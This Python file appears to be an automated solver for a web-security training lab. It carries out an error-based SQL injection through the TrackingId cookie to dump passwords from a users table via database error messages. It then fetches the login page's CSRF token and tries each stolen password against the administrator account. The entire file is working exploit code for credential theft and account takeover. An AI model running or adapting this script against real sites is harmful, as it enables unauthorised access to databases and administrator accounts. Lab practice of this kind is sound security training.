from ...utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests
import re


def solve_lab(url, proxies):
    print_info(f'Extracting passwords by visiting "{url}" with the following cookies:')
    print(
        '{"TrackingId": "\' OR (SELECT password FROM users LIMIT 1 OFFSET \033[1;93m?\033[00m)::int=1 --"}'
    )

    passwords = []
    regex = re.compile('ERROR: invalid input syntax for type integer: "(.*)"')
    while True:
        cookies = {
            "TrackingId": f"' OR (SELECT password FROM users LIMIT 1 OFFSET {len(passwords)})::int=1 --"
        }
        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)

        soup = BeautifulSoup(resp.text, "html.parser")
        match = soup.find(string=regex)

        if match is None:
            print_info_secondary(f"{len(passwords)} => None")
            break
        else:
            password = re.match(regex, match).group(1)
            print_info_secondary(f"{len(passwords)} => {password}")
            passwords.append(password)

    if len(passwords) == 0:
        print_fail("Unable to extract any passwords")
    else:
        print_success(f"Successfully extracted {len(passwords)} passwords\n")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    print_info("Attempting to log in as administrator using extracted passwords...")
    for password in passwords:
        data = {"csrf": csrf, "username": "administrator", "password": password}
        resp = s.post(
            url,
            proxies=proxies,
            verify=False,
            data=data,
        )

        soup = BeautifulSoup(resp.text, "html.parser")
        invalid = soup.find(string="Invalid username or password.")

        if invalid:
            print_info_secondary(f"{password} => {invalid}")
        else:
            print_success(f"{password} => Success\n")
            break
    else:
        print_fail("Failed to log in as administrator")
